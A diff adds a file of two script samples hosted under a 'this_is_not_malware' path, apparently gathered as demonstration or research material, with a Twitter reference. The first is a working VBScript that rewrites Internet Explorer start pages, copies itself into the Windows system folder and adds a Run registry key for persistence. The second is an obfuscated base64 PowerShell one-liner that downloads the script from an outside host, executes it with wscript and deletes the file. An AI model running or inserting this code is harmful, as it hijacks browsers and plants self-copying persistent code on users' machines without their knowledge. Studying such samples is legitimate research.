@@ -1,0 +1,51 @@
+http://kong.re.kr/this_is_not_malware/sample.vbs
+
+
+On Error Resume Next
+dim FSobj,sysDir,generateSelf,newFile,fixedCode,procreateSelf,newFileData
+
+set FSobj=CreateObject("Scripting.FileSystemObject")
+set sysDir = FSobj.GetSpecialFolder(1)
+
+createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","https://www.krcert.or.kr/main.do"
+createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","https://www.krcert.or.kr/main.do"
+createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\aoisuasdiloughlaisdg",sysDir&"\aoisuasdiloughlaisdg.vbs"
+
+set generateSelf=FSobj.CreateTextFile(sysDir+"\aoisuasdiloughlaisdg.vbs")
+generateSelf.close
+
+set newFile = FSobj.OpenTextFile(WScript.ScriptFullname,1)
+writeCopy()
+fixedCode=replace(newFileData,chr(94),"""")
+
+set procreateSelf=FSobj.OpenTextFile(sysDir+"\aoisuasdiloughlaisdg.vbs",2)
+procreateSelf.write fixedCode
+procreateSelf.close
+
+sub createRegKey(regKey,regVal)
+     set regEdit = CreateObject("WScript.Shell")
+     regEdit.RegWrite regKey,regVal
+end sub
+
+function writeCopy()
+     newFileData= "set FSobj=CreateObject(^Scripting.FileSystemObject^)" &vbcrlf& _
+     "set sysDir = FSobj.GetSpecialFolder(1)" &vbcrlf& _
+     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page^,^https://www.krcert.or.kr/main.do^" &vbcrlf& _
+     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL^,^https://www.krcert.or.kr/main.do^" &vbcrlf& _
+     "createRegKey ^HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\aoisuasdiloughlaisdg^,sysDir&^\aoisuasdiloughlaisdg.vbs^" &vbcrlf& _
+     "sub createRegKey(regKey,regVal)" &vbcrlf& _
+     "set regEdit = CreateObject(^WScript.Shell^)" &vbcrlf& _
+     "regEdit.RegWrite regKey,regVal" &vbcrlf& _
+     "end sub"
+end function
+
+------------------------------------------------------------------------------------------
+
+
+https://kong.re.kr/this_is_not_malware/t.ps1
+
+cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlACAASgBBAEIAbABBAEQAMABBAEsAQQBCAE8AQQBHAFUAQQBkAHcAQQB0AEEARQA4AEEAWQBnAEIAcQBBAEcAVQBBAFkAdwBCADAAQQBDAEEAQQBVAHcAQgA1AEEASABNAEEAZABBAEIAbABBAEcAMABBAEwAZwBCAE8AQQBHAFUAQQBkAEEAQQB1AEEARgBjAEEAWgBRAEIAaQBBAEUATQBBAGIAQQBCAHAAQQBHAFUAQQBiAGcAQgAwAEEAQwBrAEEATABnAEIARQBBAEcAOABBAGQAdwBCAHUAQQBHAHcAQQBiAHcAQgBoAEEARwBRAEEAVQB3AEIAMABBAEgASQBBAGEAUQBCAHUAQQBHAGMAQQBLAEEAQQBuAEEARwBnAEEAZABBAEIAMABBAEgAQQBBAE8AZwBBAHYAQQBDADgAQQBhAHcAQgB2AEEARwA0AEEAWgB3AEEAdQBBAEgASQBBAFoAUQBBAHUAQQBHAHMAQQBjAGcAQQB2AEEASABRAEEAYQBBAEIAcABBAEgATQBBAFgAdwBCAHAAQQBIAE0AQQBYAHcAQgB1AEEARwA4AEEAZABBAEIAZgBBAEcAMABBAFkAUQBCAHMAQQBIAGMAQQBZAFEAQgB5AEEARwBVAEEATAB3AEIAegBBAEcARQBBAGIAUQBCAHcAQQBHAHcAQQBaAFEAQQB1AEEASABZAEEAWQBnAEIAegBBAEMAYwBBAEsAUQBBADcAQQBDAFEAQQBaAFEAQQArAEEARwAwAEEATABnAEIAMgBBAEcASQBBAGMAdwBBADcAQQBBAG8AQQA7ACAAdwBzAGMAcgBpAHAAdAAuAGUAeABlACAAbQAuAHYAYgBzADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxAC4ANQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAbQAuAHYAYgBzAAoACgA=
+
+powershell.exe -e JABlAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AawBvAG4AZwAuAHIAZQAuAGsAcgAvAHQAaABpAHMAXwBpAHMAXwBuAG8AdABfAG0AYQBsAHcAYQByAGUALwBzAGEAbQBwAGwAZQAuAHYAYgBzACcAKQA7ACQAZQA+AG0ALgB2AGIAcwA7AAoA; wscript.exe m.vbs; Start-Sleep 1.5; Remove-Item m.vbs
+
+reference: https://twitter.com/h2jazi/status/1414638329488945154
